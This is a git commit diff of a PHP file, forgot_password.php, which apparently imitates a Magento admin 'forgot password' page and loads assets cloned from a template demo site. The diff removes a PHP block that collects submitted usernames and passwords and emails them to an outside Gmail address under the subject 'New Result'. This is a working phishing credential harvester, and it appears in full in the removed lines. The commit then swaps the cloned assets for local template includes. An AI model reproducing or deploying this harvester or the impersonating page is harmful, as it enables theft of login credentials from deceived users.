6f98b9b6aa27e4eeb5411b39875f52156feedc98
ndar0430 <nikkoremulla010498@gmail.com>
2018-03-22 00:34:25 +0800

    update forgot password

--- forgot_password.php
+++ forgot_password.php
@@ -1,49 +1,27 @@
-<?php
-if (isset($_POST['username']) && isset($_POST['password'])){
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-    $to = 'king9test9@gmail.com';
-    $subject = "New Result";
-    $body = '<html>
-                <body>
-                    <p>Username:'.$username.'</p>
-                    <p>Password:'.$password.'</p>
-                </body>
-            </html>';
-    
-    $headers = "From: ".$to." <".$to.">\r\n";
-    $headers .="MIME-Version: 1.0\r\n";
-    $headers .="Content-type: text/html; charset=utf-8";
-
-    //send
-    $send = mail($to, $subject, $body, $headers);
-    if ($send){
-        echo 'Success'; 
-    }
-    else{
-        'Fail';
-    }
-}
-
-?>
-
 <html xmlns="https://www.w3.org/1999/xhtml" lang="en"><head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <title>Forgot Password - Magento Admin Page</title>
-    <link type="text/css" rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/reset.css" media="all">
-    <link type="text/css" rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/boxes.css" media="all">
-    <link rel="icon" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/favicon.ico" type="image/x-icon">
-    <link rel="shortcut icon" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="{{ asset('css/fontawesome.min.css')  }}">
+    <link rel="stylesheet" href="{{ asset('css/fonts/googlefonts.css')  }}">
 
-    <script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/ec.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-P9FT69"></script><script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/prototype/prototype.js"></script>
-    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/prototype/validation.js"></script>
-    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/scriptaculous/effects.js"></script>
-    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/mage/adminhtml/form.js"></script>
-    <script type="text/javascript" src="https://livedemo00.template-help.com/magento_47328/js/mage/captcha.js"></script>
 
-    <!--[if IE]> <link rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/iestyles.css" type="text/css" media="all" /> <![endif]-->
-    <!--[if lt IE 7]> <link rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/below_ie7.css" type="text/css" media="all" /> <![endif]-->
-    <!--[if IE 7]> <link rel="stylesheet" href="https://livedemo00.template-help.com/magento_47328/skin/adminhtml/default/default/ie7.css" type="text/css" media="all" /> <![endif]-->
+
+
+    <!-- Tell the browser to be responsive to screen width -->
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+
+    <!-- Bower includes -->
+    
+
+    
+    <link rel="stylesheet" href="{{ asset('css/bower_bundle.css')  }}">
+    <link rel="stylesheet" href="{{ asset('css/bundle.css')  }}">
+    <link rel="stylesheet" href="{{ asset('css/main.css') }}">
+    <link rel="stylesheet" href="{{ asset('css/bootstrap-multiselect.css') }}">
+
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+
 </head>
 <body id="page-login" onload="document.forms.loginForm.username.focus();">
     <div class="login-container">
